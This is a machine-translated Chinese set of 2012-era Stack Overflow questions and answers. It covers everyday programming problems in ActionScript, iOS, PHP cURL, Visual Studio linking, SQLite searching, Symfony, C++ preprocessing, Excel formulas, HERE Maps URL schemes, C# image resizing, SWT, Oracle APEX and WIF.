   if (e.target.hitTestObject("fruit1")) {
    trace('hit fruit1');
   } else {

   trace('Not hit fruit');
   } 

   obj.stopDrag();

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:19:10.363

您可以使用一个数组来存储所有的水果，并使用一个循环来测试正在拖放的球：

```
var fruitArray:Array = new Array();
fruitArray.push(fruit1);
fruitArray.push(fruit2);
fruitArray.push(fruit3);

function onMouseUp(e:MouseEvent) : void
{
  for(var j=0; j<fruitArray.length; j++) { // Every piece of fruit is tested..
        if(e.target.hitTestObject(fruitArray[j])) { // ..against the ball being dragged
          trace("hit fruit:", fruitArray[j]);
        }
  }
} 
```

您将需要使用类似的 for 循环系统将事件侦听器添加到球中，然后您可以将水果拆分为不同类型的较小数组，并且只根据特定的水果数组检查球。

# iphone - iOS 启动图像和状态栏

> ID：13514498
> 
> 赞同：3
> 
> 时间：2012-11-22T14:11:02.697
> 
> 标签：iphone, ios, retina-display, iphone-5

在 iOS 应用程序中，从历史上看，启动图像应该在顶部有一个 20/40 像素的未使用区域，在应用程序启动期间状态栏将出现在该区域。在我的应用程序中，我只会有一段时间的条纹。

现在我正在调整我的应用程序以适应 4" 屏幕，我提供了具有相同条纹的 Default-568h@2x.png 图像。它不像以前那样工作（至少在模拟器上） - 出现条纹在状态栏**下方**，图像的其余部分向下移动。

我现在应该裁剪图像吗？但是，屏幕尺寸为 640x1136，与建议的启动图像尺寸完全相同。如果我从顶部裁剪状态栏，底部会出现什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:27:26.957

我遇到了同样的问题，当 Xcode 为 568h 选择正确的图像时，这可能是一个错误。尝试删除图像并将它们添加回项目，将它们复制到文件夹中，然后将它们添加到项目中。

# php - PHP：CURL PUT FOR Https Url 不能作为 fopen 工作失败

> ID：13514499
> 
> 赞同：0
> 
> 时间：2012-11-22T14:11:09.170
> 
> 标签：php, curl, https, put

我想使用 Curl 将图像上传到 url。但由于图像文件位于 https url 上，我无法使用 fopen 读取文件。

代码如下。

```
$file = "https://xyz.com/image.jpg";
$url = "http://abc.com/upload.php";

$fp = fopen($file, "r");
$headers = array("Content-Type: xml");
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_PUT, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_INFILE, $fp);
curl_setopt($ch, CURLOPT_INFILESIZE, filesize($file));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
$responseInfo = curl_getinfo($ch);
curl_close($ch); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:22:19.187

我认为这应该可行，假设您不需要将上传的文件数据作为命名键/值对传递。

```
$file = "https://xyz.com/image.jpg";
$url = "http://abc.com/upload.php";

$fileData = file_get_contents($file);

$fp = fopen($file, "r");
$headers = array("Content-Type: xml");
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $fileData);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
$responseInfo = curl_getinfo($ch);
curl_close($ch); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-13T07:32:28.277

代替：

```
curl_setopt($ch, CURLOPT_PUT, true); 
```

PUT API 请求的 opt 设置在使用以下设置时可以正常工作：

```
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT"); 
```

# visual-studio-2010 - LNK1104：无法打开文件 'rpcndr4.lib'

> ID：13514507
> 
> 赞同：3
> 
> 时间：2012-11-22T14:11:39.083
> 
> 标签：visual-studio-2010, linker, visual-studio-2005, porting, platform-sdk

我在 WindowsXP 64 位平台的 VS2005 中工作，现在我正在将我的所有项目转换为 Windows7 64 位的 VS2010。在构建我的一个项目时，我收到链接错误“LNK1104：无法打开文件 rpcndr.lib”。该项目在 VS2005 中构建，在我的机器上没有任何问题。

是否与平台 SDK 相关..？否则这个问题的解决方案是什么。？

我从一个链接中读到我必须安装最新的平台 SDK 来解决这个问题。我尝试下载适用于 Windows7 的平台 SDK 4.0，但由于无限停止下载，它总是在我的机器上失败。

问候，尼克松

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-21T15:29:15.387

> 是否与平台 SDK 相关..？否则这个问题的解决方案是什么。？

问题解决方案：'rpcndr4.lib' 在新 SDK 中已过时，因此只需编辑您的项目 > Props > Linker > input > Addition Dep..: 并删除 'rpcndr4.lib'

> 我从一个链接中读到我必须安装最新的平台 SDK 来解决这个问题。我尝试下载适用于 Windows7 的平台 SDK 4.0，但由于无限停止下载，它总是在我的机器上失败。

解决方法：我遇到了同样的问题。因此，我毫无问题地将 SDK 下载到了我的 Windows-7 32 位笔记本电脑上，然后将其复制到了我的 Win-7 64 位台式机上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-05-20T11:56:27.933

我刚刚从以下网站中提到的评论中解决了这个问题： [https ://henbo.wordpress.com/2006/11/22/lnk1181-cannot-open-input-file-rpcndr-lib/](https://henbo.wordpress.com/2006/11/22/lnk1181-cannot-open-input-file-rpcndr-lib/)

> 您还需要删除注释
> 
> //#pragma comment(lib, “rpcndr.lib”)
> 
> 在 dlldatax.c 文件中

# python - 搜索 Sqlite 数据库 - 所有表和列

> ID：13514509
> 
> 赞同：13
> 
> 时间：2012-11-22T14:11:55.593
> 
> 标签：python, sqlite, search

是否有可用于搜索 Sqlite 数据库的所有表和列的库或开源实用程序？唯一的输入是 sqlite DB 文件的名称。

我正在尝试编写取证工具，并希望在 sqlite 文件中搜索特定字符串。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-22T14:27:26.933

您可以使用它`"SELECT name FROM sqlite_master WHERE type='table'"` 来找出数据库中表的名称。从那里很容易选择每个表的所有行。

例如：

```
import sqlite3
import os

filename = ...
with sqlite3.connect(filename) as conn:
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()    
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
    for tablerow in cursor.fetchall():
        table = tablerow[0]
        cursor.execute("SELECT * FROM {t}".format(t = table))
        for row in cursor:
            for field in row.keys():
                print(table, field, row[field]) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-12-20T20:21:00.577

我知道聚会迟到了，但我遇到了类似的问题，但由于它位于 docker 映像中，因此我无法访问 python，所以我像这样解决了它：

```
for X in $(sqlite3 database.db .tables) ; do sqlite3 database.db "SELECT * FROM $X;" | grep >/dev/null 'STRING I WANT' && echo $X; done 
```

这将遍历数据库文件中的所有表并执行全选操作，然后我对字符串进行 grep。如果它找到字符串，它会打印表格，然后我可以从那里简单地使用 sqlite3 来找出它是如何使用的。

认为它可能对其他无法使用 python 的人有所帮助。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2020-12-19T19:10:00.967

只需转储数据库并搜索它。

`% sqlite3 file_name .dump | grep 'my_search_string'`

您可以改为通过 less 管道，然后使用 / 进行搜索：

`% sqlite3 file_name .dump | less`

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2019-12-19T09:52:15.507

@MrWorf 的回答不适用于我的 sqlite 文件（来自 Evernote 的 .exb 文件），但这种类似的方法有效：

*   使用 DB Browser for SQLite 打开文件`sqlitebrowser mynotes.exb`
*   文件/导出到 SQL 文件（将创建 mynotes.exb.sql）
*   `grep 'STRING I WANT" mynotes.exb.sql`

# mongodb - 使用 FOSUserBundle 防止重复登录

> ID：13514513
> 
> 赞同：4
> 
> 时间：2012-11-22T14:12:20.343
> 
> 标签：mongodb, symfony, fosuserbundle

我们的应用程序使用**Symfony 2.0**和带有**FOSUserBundle的****MongoDB**进行用户管理。

 ****客户希望防止在其应用程序中同时从不同设备使用相同的用户名登录。**

我们的想法是在成功登录时使同一用户的所有其他会话无效/删除。

问题是，我们无法在 DB 中保存会话，因为 Mongo 会话处理程序是在 2.1 版中添加的。

我们提出的唯一解决方案是遍历保存在文件系统中的会话文件，并检查用户的用户名是否保存在该文件中。如果这是真的，我们只需删除该文件并终止其他位置的登录会话。当然，我们必须检查我们是否也没有删除当前会话。

有谁知道如何解决这个问题？如果没有，是否有我们应该知道的隐藏陷阱？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T00:04:42.393

您可以在登录时存储当前用户 IP 的用户实体中添加一个 IP 地址列。在每次页面加载时（通过事件监听器），您可以检查存储在数据库中的 IP 与请求页面的人的 IP。如果数据库中的 IP 与当前用户的 IP 不匹配（有人从另一个位置登录），请将其注销。

更进一步，通过 ajax，您可以每 X 秒调用一次执行相同类型检查的服务器，并在 ajax 请求返回错误匹配时执行重定向以注销用户。**

# c++ - 预处理器保留宏

> ID：13514517
> 
> 赞同：0
> 
> 时间：2012-11-22T14:12:40.953
> 
> 标签：c++, c-preprocessor

我想预处理 C++ 头文件，*将*所有宏逐字保留在输出文本中。

为此，我需要一个类似 C 预处理器的程序来执行这些任务：

*   将指令中的宏存储在内存中`#define`；
*   递归地遵循`#include`指令；
*   评估条件`#if`和`#ifdef`指令；
*   抑制`#if`.. `#else`..`#endif`块的非活动部分中的代码；
*   （可选）删除`/* .. */`和`//`评论；
*   删除所有剩余的指令行。

但是*不能*在输出中替换宏。或者，预处理器可以将不应替换的宏名称列表作为参数。

这听起来可能很奇怪，但我有一个很好的理由。我有一系列能够分析预处理 C++ 类头的 Perl 脚本。我使用一些宏来告诉他们例如要导出哪些方法。

我还没有找到能够执行我需要的预处理程序，所以我编写了一个 Perl 脚本。后者实际上有效，但速度慢且不标准。我正在寻找更好的选择。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:31:59.263

用于`gcc -E`手动运行预处理器。这将扩展所有宏，但这不是问题。

当您需要 Perl 脚本的输出时，您需要的是特殊的宏。尝试这个：

```
#ifdef PERL_PREPROCESSING
# define EXPORT(...) PERL_EXPORT
#else
# define EXPORT(...) ...normal C code...
#endif 
```

所以这个想法是你调用`gcc -E -DPERL_PREPROCESSING`来切换一些宏来产生你的 perl 脚本可以找到的输出。宏将照常扩展。

**[编辑]**如果您不想使用特定于 Perl 的宏来污染源代码，请使用以下技巧：创建一个文件夹，其中包含带有宏的 Perl 版本的头文件，并在每个其他文件夹之前包含此文件夹`-I`。`gcc`然后将忽略标准头文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:25:39.663

如果您使用 *nix，您可以使用 grep 命令查找目录中的所有#defines

```
grep -R . '#define' 
```

对于所需的预处理，请使用 gcc -E。

# excel - Excel - 垂直查找列表（无 VBA）

> ID：13514522
> 
> 赞同：1
> 
> 时间：2012-11-22T14:12:47.863
> 
> 标签：excel, excel-formula

我想找到一个公式，给我一个包含特定日期的单元格列表。

例子：

```
name   -    day      -   amount      -    month (hidden)
a         01-01-2012     5                =month(01-01-2012) = 1
b         02-01-2012     4                =month(02-01-2012) = 1
c         10-01-2012     3                =month(10-01-2012) = 1
d         10-01-2012     6                =month(10-01-2012) = 1
e         11-02-2012     2                =month(11-02-2012) = 2 
```

所以在这个例子中，我想得到一月的所有（唯一）天（在我的例子中是一个列表：01-01-2012、02-10-2012 和 10-01-2012）。之后我想知道上面列表中这些天的总金额（但这很容易，我想我会单独找到：p）

我第一次使用垂直查找公式，但这给了我一月份的一天，而不是一月份所有日子的列表。

实际上这是我需要的过滤器，但有一个公式

感谢您的时间和帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T18:46:13.197

垂直获取列表：

表格 H 列中的公式（数组公式，使用 Ctrl-Shift-Enter 插入，Excel 插入的大括号，而不是用户插入）：

```
{=INDEX($B$2:$B$10;MATCH(0;COUNTIF($H$1:H1;$B$2:$B$10);0))} 
```

单元格应格式化为 Date 以获取日期，而不是整数。

横向：

```
{=INDEX(Data!$B$2:$B$10;MATCH(0;COUNTIF($A6:A6;Data!$B$2:$B$10);0))} 
```

要过滤掉 10 月的特殊日子：

```
=INDEX(Data!$B$2:$B$10;MATCH(0;IF(COUNTIF(A4:$A4;Data!$B$2:$B$10)=0;IF(MONTH(Data!$B$2:$B$10)=10;0;1);1);0)) 
```

您的工作表已修改：[http ://www.bumpclub.ee/~jyri_r/Excel/filter_formula_month.xls](http://www.bumpclub.ee/~jyri_r/Excel/filter_formula_month.xls)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:30:38.710

选择您希望结果开始出现的单元格。

选择数据功能区，在过滤器下您会发现高级

选择您要过滤的日期，然后在该对话框的底部，您会找到一个仅包含唯一项目的复选框，选中该复选框。

鲍勃是你叔叔

# iphone - 如何仅在导航栏的 barbutton 项中启用用户交互？

> ID：13514525
> 
> 赞同：1
> 
> 时间：2012-11-22T14:12:58.397
> 
> 标签：iphone, ios, ipad

我有一个应用程序，它具有新的 Facebook 应用程序，如 UI。在那里，有一个侧面菜单控制器。它在导航栏上有一个按钮，点击它会给你菜单。但我的问题是在示例中我使用的导航栏也可以移动，我通过在导航栏中设置 userinteractionenabled=no 来解决这个问题。但我只需要在导航栏中的按钮中启用用户交互。如果我喜欢我所做的，整个导航栏就变得不可点击。任何人都可以帮助我实现这一目标吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:18:20.723

如果您有自定义按钮，请使用此按钮

```
UIBarButtonItem *button = self.navigationItem.rightBarButtonItem;
button.enabled = NO; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-08-08T18:12:17.720

这是我使用的代码。它并不能完全启用用户交互，但我想出了如何将标题设置为白色，然后单击更改颜色。（查看 setTitleColor 行覆盖 func viewDidLoad() { super.viewDidLoad()

```
let handleButton = UIButton.init(type: .custom)
    button.setTitle("Register", for: .normal)
    button.layer.backgroundColor = CGColor.init(gray: 0.0, alpha: 0.0)
    button.setTitleColor(.white, for: .normal)
    button.setTitleColor(.red, for: .highlighted)
       button.layer.borderWidth = 1
       button.layer.cornerRadius = 5
       button.layer.borderColor = UIColor.white.cgColor
    self.navigationItem.rightBarButtonItem = UIBarButtonItem(customView: button)

    button.addTarget(self, action: #selector(didTapRegister), for: .touchUpInside)

    if let button = self.navigationItem.rightBarButtonItem?.customView {
        button.frame = CGRect(x:0, y:0, width:80, height:34)
} 
```

# iphone - 通过 API 启动诺基亚 HERE Maps iOS

> ID：13514532
> 
> 赞同：4
> 
> 时间：2012-11-22T14:13:26.630
> 
> 标签：iphone, nokia, launching-application, here-api

是否有用于启动诺基亚 HERE Maps iOS 应用程序以进行转弯导航的记录 API？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-07-22T17:49:30.987

```
here-place://lat,lon e.g. here-place://48.866833,2.355411 
```

在给定的地方打开这里。

```
here-route://lat1,lon1,name1/lat2,lon2,name2 
```

开始从 lat1,lon1 到 lat2,lon2 的轮流导航。

```
here-route:///lat2,lon2,name2 
```

从用户位置开始逐个导航到 lat2,lon2。

编辑：似乎名称字段现在支持 URL 百分比转义以编码空格和其他字符（在 Here WeGo v2.0.11 中测试。感谢 marcel 的提醒）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-05-11T09:43:59.137

更改为`here-location://lat,lon,name`最新版本（可能是 1.2 左右）。`name`是可选的。

`here-place`并`here-route`给出`Couldn't open link`错误，所以那里的语法可能发生了变化。也许你可以在那里指定地址，但这超出了我的研究范围。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-04-21T02:33:27.990

在这里我们去`2.0.20 (537)`：

*   `here-route`使用自定义URL 方案 打开一个 URL ：
    *   `//mylocation/latitude,longitude`
    *   `,URLencoded string`作为目的地的名称
    *   `?ref=<Referrer>`推荐人（可以是您的应用程序或公司名称）
    *   `&m=w`表示路由模式（m=w代表walk，m=d代表drive）

例如，`here-route://mylocation/37.870090,-122.268150,Downtown%20Berkeley? ref=<Referrer>&m=w`请求一家名为 Referrer 的公司步行前往伯克利市中心的目的地。

资料来源：[HERE 开发人员按需移动技术解决方案论文](https://developer.here.com/documentation/download/aggregated_platform_use_cases_hlp/1.0.0/Mobility%20On-Demand%20v1.0.0%20White%20Paper.pdf)（第 36 页）

* * *

我刚刚对此进行了测试，并且效果很好。最重要的一点（至少对我来说）是**`/mylocation/`必须在 URL 中**，以便 HERE WeGo 从用户的当前位置开始导航（字面意思是单词`mylocation`必须在那里）。

`here-route://sourceLat,sourceLon,sourceOptionalName/destLat,destLon,destOptionalName`如果您不想从用户的当前位置导航，也可以使用。

我还进行了测试`here-location://lat,lon,optionalName`，它在 HERE WeGo 的当前（最新，请参阅此答案的顶部）版本中运行良好（它曾经是`here-place`，但它不再工作了）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T14:23:40.823

应用程序的 URL 方案可以在应用程序的`Info.plist`. 在`Info.plist -> URL Types -> URL Schemes -> xxxxx`

从 ipa 中提取捆绑内容很容易。将文件从 .ipa 重命名为 .zip 并解压缩以提取内容。右键单击 DownloadedApp.app 并显示包内容。你会在那里找到 Info.plist、图标、压缩 nib、可执行文件等。

对于诺基亚 HERE 地图应用，它是**`nok`**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-10-14T08:28:23.993

@FKDev

基本上你可以用 %20 符号替换空格。[在NSData 和 NSURL](https://stackoverflow.com/questions/1441106/nsdata-nsurl-url-with-space-having-problem)上找到- 带有空格的 url 有问题或[带有变量的 NSURL 中的空格无法加载](https://stackoverflow.com/questions/5845425/spaces-in-a-nsurl-with-variables-doesnt-load)

我也更喜欢使用示例中显示的内部转换器

Xcode 示例

```
NSString *sUrl = @"here-route:///52.379189,4.899431,Amsterdam Central
sUrl = [sUrl stringByAddingPercentEscapesUsingEncoding:NSASCIIStringEncoding];
 NSURL *url = [NSURL URLWithString:sUrl]; 
```

C# 示例

```
var sUrl= Uri.EscapeUriString(@"here-route:///52.379189,4.899431,Amsterdam Central");
var url = new NSUrl(sUrl); 
```

两个样本都在这里-route:///52.379189,4.899431,Amsterdam%20Central

# c# - 调整图像大小而不保存在磁盘上

> ID：13514535
> 
> 赞同：2
> 
> 时间：2012-11-22T14:13:33.217
> 
> 标签：c#, asp.net

在 asp.net 中，我想调整图像大小并在某些控件上显示，但不保存在磁盘上。有没有像 clasic asp 一样的免费实用程序。

[http://www.aspjpeg.com/livedemo.html](http://www.aspjpeg.com/livedemo.html)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:24:25.330

这个缩略图类将完成这项工作。

```
public class Thumbnail
{
    private string _filePath;
    private int _maxWidth = 120;
    private int _maxHeight = 120;

    public string MimeType;
    public System.Drawing.Imaging.ImageFormat ImageFormat;
    public byte[] ImageBytes;

    public Thumbnail(string filePath, int maxWidth, int maxHeight)
    {
        _filePath = filePath;
        _maxWidth = maxWidth;
        _maxHeight = maxHeight;

        MakeThumbnail();
    }

    private void MakeThumbnail()
    {
        using (Image img = new Bitmap(_filePath))
        {
            Size newSize = GenerateImageDimensions(img.Width, img.Height, _maxWidth, _maxHeight);
            int imgWidth = newSize.Width;
            int imgHeight = newSize.Height;

            // create the thumbnail image
            using (Image img2 =
                      img.GetThumbnailImage(imgWidth, imgHeight,
                      new Image.GetThumbnailImageAbort(Abort),
                      IntPtr.Zero))
            {

                using (Graphics g = Graphics.FromImage(img2)) // Create Graphics object from original Image
                {
                    g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.High;
                    g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;

                    //BMP 0, JPEG 1 , GIF 2 , TIFF 3, PNG 4
                    System.Drawing.Imaging.ImageCodecInfo codec;

                    switch (Path.GetExtension(_filePath))
                    {
                        case ".gif":
                            codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()[2];
                            ImageFormat = System.Drawing.Imaging.ImageFormat.Gif;
                            MimeType = "image/gif";
                            break;

                        case ".png":
                            codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()[4];
                            ImageFormat = System.Drawing.Imaging.ImageFormat.Png;
                            MimeType = "image/png";
                            break;

                        default: //jpg
                            codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()[1];
                            ImageFormat = System.Drawing.Imaging.ImageFormat.Jpeg;
                            MimeType = "image/jpg";
                            break;
                    }

                    //Set the parameters for defining the quality of the thumbnail... here it is set to 100%
                    System.Drawing.Imaging.EncoderParameters eParams = new System.Drawing.Imaging.EncoderParameters(1);
                    eParams.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 90L);

                    //Now draw the image on the instance of thumbnail Bitmap object
                    g.DrawImage(img, new Rectangle(0, 0, img2.Width, img2.Height));

                    MemoryStream ms = new MemoryStream();
                    img2.Save(ms, codec, eParams);
                    ImageBytes = new byte[ms.Length];
                    ImageBytes = ms.ToArray();

                    ms.Close();
                    ms.Dispose();
                }
            }
        }
    }

    public static Size GenerateImageDimensions(int currW, int currH, int destW, int destH)
    {
        int imgWidth = currW;
        int imgHeight = currH;

        if (imgWidth > destW)
        {
            double rate = (double)imgWidth / (double)destW;
            imgWidth = destW;
            imgHeight = (int)(imgHeight / rate);
        }

        if (imgHeight > destH)
        {
            double rate = (double)imgHeight / (double)destH;
            imgHeight = destH;
            imgWidth = (int)(imgWidth / rate);
        }

        return new Size(imgWidth, imgHeight);
    }

    private bool Abort()
    {
        return false;
    }
} 
```

使用很简单，只需将其放在您的页面代码隐藏中即可。浏览器输出将调整大小的图像。

```
Thumbnail thm = new Thumbnail("c:\some_image.jpg", 300, 300);
Response.ContentType = thm.MimeType;
Response.BinaryWrite(thm.ImageBytes); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-22T14:16:29.023

这可能是您需要的：

[http://imageresizing.net/](http://imageresizing.net/)

# eclipse - CoolBar（java SWT WindowBuilder）组合没有出现在应用程序中

> ID：13514539
> 
> 赞同：1
> 
> 时间：2012-11-22T14:13:50.650
> 
> 标签：eclipse, swt, composite, windowbuilder

当我尝试在复合材料中使用coolBar 然后将此复合材料嵌入应用程序时遇到问题。coolBar 根本没有出现。其他工具不会出现此问题，例如 toolBar 和其他组合。我能做错什么或忘记什么？

在遵循代码之前，我参考了我的系统：

*   Win7
*   Eclipse：版本：Indigo Service Release 2 Build id：20120216-1857
*   谷歌 WindowBuilder 1.5.0 谷歌
*   插件 3.1.0
*   SWT 设计器 1.5.0
*   谷歌网络工具包 2.4.0

**复合代码：**

```
package xx.xxx.xx.pcommJavaGUI.composites;

import org.eclipse.swt.widgets.Composite;

public class TestComposite extends Composite {

    public TestComposite(Composite parent, int style) {
        super(parent, style);
        setLayout(new GridLayout(1, false));

        CoolBar coolBar = new CoolBar(this, SWT.FLAT);

        CoolItem coolItem = new CoolItem(coolBar, SWT.NONE);

        Button btnTest = new Button(coolBar, SWT.NONE);
        coolItem.setControl(btnTest);
        btnTest.setText("Test");

        Tree tree = new Tree(this, SWT.BORDER);
        tree.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, true, 1, 1));

    }

    @Override
    protected void checkSubclass() {
        // Disable the check that prevents subclassing of SWT components
    }

} 
```

**和应用程序窗口代码：**

```
package xx.xxx.xx.pcommJavaGUI.composites;

import org.eclipse.swt.SWT;

public class TestApplication {

    protected Shell shell;

    public static void main(String[] args) {
        try {
            TestApplication window = new TestApplication();
            window.open();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void open() {
        Display display = Display.getDefault();
        createContents();
        shell.open();
        shell.layout();
        while (!shell.isDisposed()) {
            if (!display.readAndDispatch()) {
                display.sleep();
            }
        }
    }

    protected void createContents() {
        shell = new Shell();
        shell.setSize(450, 300);
        shell.setText("SWT Application");
        shell.setLayout(new GridLayout(1, false));

        TestComposite tc = new TestComposite(shell, SWT.NONE);
        GridData gd_tc = new GridData(SWT.FILL, SWT.FILL, false, false, 1, 1);
        tc.setLayoutData(gd_tc);            
    }
} 
```

感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:14:47.407

这可能只是因为您没有为酷栏设置布局数据。请参阅[本文](http://www.eclipse.org/articles/article.php?file=Article-Understanding-Layouts/index.html)以了解布局的工作原理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:40:26.360

您必须`CoolItem`手动设置大小。

*   首先，`pack();`您`Button`将其设置为默认大小。
*   然后将 的大小设置为`CoolItem`的大小`Button`。

`Button`: _

```
 Button btnTest = new Button(coolBar, SWT.NONE);
    coolItem.setControl(btnTest);
    btnTest.setText("Test");

    // If you do not call this, btnTest.getSize() will give you x=0,y=0.
    btnTest.pack(); 
```

设置大小`CoolItem`：

```
 Point size = btnTest.getSize();
    coolItem.setControl(btnTest);
    coolItem.setSize(coolItem.computeSize(size.x, size.y)); 
```

**链接**：

*   [酷吧示例](http://www.java2s.com/Code/Java/SWT-JFace-Eclipse/CoolBarExamples.htm)
*   [API: Control.pack();](http://help.eclipse.org/indigo/topic/org.eclipse.platform.doc.isv/reference/api/org/eclipse/swt/widgets/Control.html#pack%28%29)

# oracle-apex - 从第 0 页计算 IR 的总行数

> ID：13514548
> 
> 赞同：1
> 
> 时间：2012-11-22T14:14:14.007
> 
> 标签：oracle-apex

我的应用程序中有许多不同的交互式报表（使用 Oracle ApEx 4.1），位于不同的页面上。

在每份报告中，我都有分页，但我还被要求在每份报告中提供记录总数，显示在每个报告页面的某个位置。

是否有办法在第 0 页上执行此功能，或者我是否需要分别计算每个报告的总记录？

谢谢。

==============================

**Tom - 将此评论放在下方时遇到问题，因此在此处添加：

嗨，汤姆，正如我之前对您的评论中提到的，我添加了新的“ **p_use_filter** ”布尔参数并将其设置为 FALSE，一切正常，非常感谢。

现在我确实有另一个查询要给您，但不确定这是否仍然是您可能正在处理的事情，但是在我的 where 条件下，在其中一个 IR 报告中，我使用的是绑定变量，但是当我深入研究报告字段时将绑定变量 STRING 传递给另一个报告，然后查看后端 SQL 语句，我收到 INVALID RELATIONAL OPERATOR 错误，因为 SQL 具有 WHERE 条件，例如：

```
WHERE (CUSTOMER_NAME = ABC AIRLINES LTD ) 
```

即它试图在没有单引号的情况下解析**ABC AIRLINES LTD**周围的 SQL ？

任何想法汤姆。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:08:53.227

我建议检索 IR sql，然后执行包装在`SELECT COUNT(*) from (...)`.
现在，在 apex 4.2 中，您可以获得 apex_ir 包，它可以获取报告 sql，但在 4.2 之前的版本中，您没有这样的包。我为自己做了一个，我已经用它做了几件事（例如，[我写了一些关于这些](http://tpetrus.blogspot.be/2012/03/record-navigation-plugged-in.html)的博客）。我为代码的当前状态道歉，因为它需要一些清理，但它是功能性的，并且有很多评论。它将解析所有过滤器并将它们再次转换为 sql。它不处理计算或分组。它可能会在某处的电缆中留下一些扭结，但这可能取决于您想用它做什么。在这种情况下，它应该不是问题。

[git链接](https://github.com/tompetrus/oracle-apex-ir-pkg.git)

基本上，在你的模式中安装包，然后使用这样的代码来运行它：

```
DECLARE
   lNullTable  DBMS_SQL.VARCHAR2_TABLE;
   lDebug      VARCHAR2(4000);
   lSql        VARCHAR2(4000);
   lCount      NUMBER;
BEGIN
   lSql := apex_ir_pkg.get_ir_sql
      (
         p_app_id             => :APP_ID,
         p_session_id         => :APP_SESSION,
         p_page_id            => :APP_PAGE_ID,
         p_report_id          => NULL,
         p_app_user           => :APP_USER,
         p_use_session_state  => TRUE,
         p_binds              => lNullTable,
         p_binds_val          => lNullTable,
         p_incl_order_by      => FALSE,
         p_debug              => lDebug,
      );

   lSql := 'SELECT count(*) FROM ('||lSql||')';

   EXECUTE IMMEDIATE lSql INTO lCount;
END; 
```

如果您确实遇到了一些麻烦并且无法解决，您可以联系我，我会看看我能做些什么。我知道一些代码大修是必要的，但我还没有得到它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T18:20:03.840

您可以在区域的页眉或页脚中使用#TOTAL_ROWS#，但它只会显示初始值。我将它用于经典报告。我不认为它与 IR javascript 配合得很好。这是部分页面刷新。请参阅：[https](https://forums.oracle.com/forums/thread.jspa?threadID=2239712) ://forums.oracle.com/forums/thread.jspa?threadID=2239712和[http://docs.oracle.com/cd/E23903_01/doc/doc.41/e21674/ui_region.htm#CHDBCGJH](http://docs.oracle.com/cd/E23903_01/doc/doc.41/e21674/ui_region.htm#CHDBCGJH)

# objective-c - 项目未在 iOS 的 Objective-c 中使用 round_page 编译

> ID：13514549
> 
> 赞同：-2
> 
> 时间：2012-11-22T14:14:15.447
> 
> 标签：objective-c, ios, c, posix

当我尝试在我的项目中使用 round_page() 函数时，它会停止编译并说存在链接器问题。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:10:22.153

抱歉，我意识到我只需要包含 mach/mach-init.h

# .net - WIF 4.5 BootstrapContext 安全令牌 null

> ID：13514553
> 
> 赞同：24
> 
> 时间：2012-11-22T14:14:24.700
> 
> 标签：.net, wcf, security, wif, saml

我正在使用新的 4.5 WIF 东西来验证网站的用户并保护我的 MVC 网站和 WCF 服务之间的通信。

我将网站配置为保存引导上下文，以便我可以对服务层的所有请求重新使用相同的安全令牌。

在正常情况下，每个网站请求都经过身份验证并通过上下文提供 SecurityToken 以保护 WCF 调用，一切正常。

但是，如果网站应用程序域被重置（例如，在开发时构建应用程序），对网站的任何请求仍将被验证，但 SecurityToken 在上下文中不再可用以传递给 WCF 调用。

